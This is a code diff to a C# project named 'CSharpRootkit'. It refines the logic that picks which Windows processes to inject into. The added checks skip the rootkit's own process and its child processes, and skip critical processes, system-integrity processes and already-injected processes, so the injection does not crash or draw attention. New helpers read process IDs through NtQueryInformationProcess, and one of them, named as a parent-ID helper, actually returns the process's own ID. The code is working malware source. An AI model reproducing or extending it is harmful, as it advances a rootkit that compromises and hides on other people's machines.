@@ -508,27 +508,76 @@ namespace CSharpRootkit
 
         public static bool ShouldInject(IntPtr ProcessHandle) 
         {
+            uint currentProcId = NativeMethods.GetCurrentProcessId();
+
+            if (!GetParentProcessIdFromHandle(ProcessHandle, out int procId) || procId == currentProcId) 
+            {
+                return false;
+            }
+
+            if (!GetParentProcess(ProcessHandle, out int parentProc) || (uint)parentProc == currentProcId) //make sure its not a subprocess, for example if c# spawns a conhost, injecting into it can cause a crash.
+            {
+                return false;
+            }
+
             if (!IsAdmin() && IsProcessAdmin(ProcessHandle, out bool IsprocAdmin) && IsprocAdmin) 
             {
                 return false;
             }
 
-            if (processHasInjectionFlag(ProcessHandle, out bool isInjected) && isInjected)
+            if (!processHasInjectionFlag(ProcessHandle, out bool isInjected) || isInjected)
             {
                 return false;
             }
 
-            if (IsProcessCritical(ProcessHandle, out bool isCritical) && isCritical) 
+            if (!IsProcessCritical(ProcessHandle, out bool isCritical) || isCritical) 
             {
                 return false;
             }
-            if (GetProcessIntergrityLevel(ProcessHandle, out uint IntergrityLevel) && IntergrityLevel < (uint)InternalStructs.TokenIntegrityLevel.Medium) 
+            if (!GetProcessIntergrityLevel(ProcessHandle, out uint IntergrityLevel) || IntergrityLevel < (uint)InternalStructs.TokenIntegrityLevel.Medium || IntergrityLevel >= (uint)InternalStructs.TokenIntegrityLevel.System)//only allow injection into medium, medium+ and high process. the others can cause error within c# 
             {
                 return false;
             }
             return true;
         }
+        public static bool GetParentProcessIdFromHandle(IntPtr handle, out int procId)
+        {
+            procId = 0;
+            PROCESS_BASIC_INFORMATION procInfo = new PROCESS_BASIC_INFORMATION();
+            uint readOut = 0;
+            if (NativeMethods.NtQueryPbi64From64(handle, PROCESSINFOCLASS.ProcessBasicInformation, ref procInfo, (uint)Marshal.SizeOf(procInfo), ref readOut) == 0)
+            {
+                procId = (int)procInfo.UniqueProcessId;
+                return true;
+            }
+            return false;
+        }
 
+        public static bool GetParentProcess(int pid, out int parentProc)
+        {
+            parentProc = 0;
+            IntPtr ProcessHandle = NativeMethods.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, false, (uint)pid);
+            if (ProcessHandle == IntPtr.Zero)
+            {
+                return false;
+            }
+            bool result = GetParentProcess(ProcessHandle, out parentProc);
+            NativeMethods.CloseHandle(ProcessHandle);
+            return result;
+        }
+
+        public static bool GetParentProcess(IntPtr handle, out int parentProc) 
+        {
+            parentProc = 0;
+            PROCESS_BASIC_INFORMATION procInfo = new PROCESS_BASIC_INFORMATION();
+            uint readOut = 0;
+            if (NativeMethods.NtQueryPbi64From64(handle, PROCESSINFOCLASS.ProcessBasicInformation, ref procInfo, (uint)Marshal.SizeOf(procInfo), ref readOut) == 0) 
+            {
+                parentProc = (int)procInfo.InheritedFromUniqueProcessId;
+                return true;
+            }
+            return false;
+        }
 
         public static bool ShouldInject(int pid)
         {
